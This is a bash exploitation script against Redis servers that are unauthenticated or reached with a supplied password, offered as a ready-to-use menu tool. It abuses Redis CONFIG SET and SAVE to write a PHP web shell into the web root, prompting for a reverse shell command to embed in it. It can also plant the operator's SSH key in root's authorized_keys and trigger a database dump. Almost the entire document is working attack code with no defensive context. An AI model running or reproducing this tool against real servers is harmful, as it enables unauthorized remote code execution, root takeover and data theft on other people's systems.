#!/bin/bash

# Function to display the help menu
function show_help() {
  echo -e "\nUsage: $0 <host> <port> [password]"
  echo -e "If no password is provided, the script assumes no authentication is required.\n"
  exit 1
}

# Check if at least host and port are provided
if [ $# -lt 2 ]; then
  show_help
fi

HOST=$1
PORT=$2
PASSWORD=${3:-""}

# Execute Redis commands with error handling
function redis_cmd() {
  local command="$@"
  local result

  if [ -z "$PASSWORD" ]; then
    result=$(redis-cli -h "$HOST" -p "$PORT" $command 2>&1)
  else
    result=$(redis-cli -h "$HOST" -p "$PORT" -a "$PASSWORD" $command 2>&1)
  fi

  echo "$result"

  if echo "$result" | grep -q "ERR"; then
    echo "Redis Error: $result"
    exit 1
  fi
  if echo "$result" | grep -q "MISCONF"; then
    echo "Warning: Redis cannot persist to disk due to configuration issues."
    echo "You may encounter issues with commands requiring persistence."
  fi
  return 0
}

# Connect to Redis using a purely read-only command
function connect_to_redis() {
  echo "Testing Redis connection on $HOST:$PORT..."
  local result=$(redis_cmd INFO | grep redis_version)

  if [ $? -eq 0 ]; then
    echo "Connection successful! Redis version: $result"
  else
    echo "Failed to connect to Redis on $HOST:$PORT. Output:"
    echo "$result"
    exit 1
  fi
}

# Inject a web shell with user-specified command
function inject_user_shell() {
  echo "Injecting a custom web shell..."
  local SHELL_DIR="/var/www/html"
  local SHELL_FILENAME="customshell.php"

  echo "Enter the shell command you want to execute in the web shell (e.g., reverse shell payload):"
  read -p "Enter the Reverse Shell Command here: " SHELL_PAYLOAD

  if [ -z "$SHELL_PAYLOAD" ]; then
    echo "No payload provided. Exiting."
    exit 1
  fi

  echo "Using the following payload:"
  echo "<?php system(\"$SHELL_PAYLOAD\"); ?>"

  redis_cmd CONFIG SET dir "$SHELL_DIR"
  redis_cmd CONFIG SET dbfilename "$SHELL_FILENAME"
  echo -en "<?php system(\"$SHELL_PAYLOAD\"); ?>" | redis_cmd -x SET customshell
  redis_cmd SAVE

  echo "Web shell injected! Access it at: http://$HOST/$SHELL_FILENAME"
}

# Dump the database
function dump_database() {
  echo "Dumping the database..."
  redis_cmd SAVE
  echo "Database dumped. Fetch it from the Redis directory (default is /var/lib/redis)."
}

# Inject SSH key
function inject_ssh_key() {
  echo "Injecting SSH key for root access..."
  local SSH_DIR="/root/.ssh/"
  local SSH_FILENAME="authorized_keys"

  if [ ! -f ~/.ssh/id_rsa.pub ]; then
    echo "SSH public key not found at ~/.ssh/id_rsa.pub"
    exit 1
  fi

  local SSH_KEY=$(cat ~/.ssh/id_rsa.pub)
  redis_cmd CONFIG SET dir "$SSH_DIR"
  redis_cmd CONFIG SET dbfilename "$SSH_FILENAME"
  echo -en "\n\n\n\n$SSH_KEY" | redis_cmd -x SET ssh_key
  redis_cmd SAVE

  echo "SSH key injected! Try logging in: ssh root@$HOST"
}

# Main menu
connect_to_redis
echo -e "\nConnected to Redis. Select an action:"
echo "1. Inject a custom PHP web shell"
echo "2. Dump the database to disk"
echo "3. Inject an SSH key for root access"
read -p "Enter your choice: " choice

case $choice in
  1) inject_user_shell ;;
  2) dump_database ;;
  3) inject_ssh_key ;;
  *) echo "Invalid choice. Exiting." ;;
esac
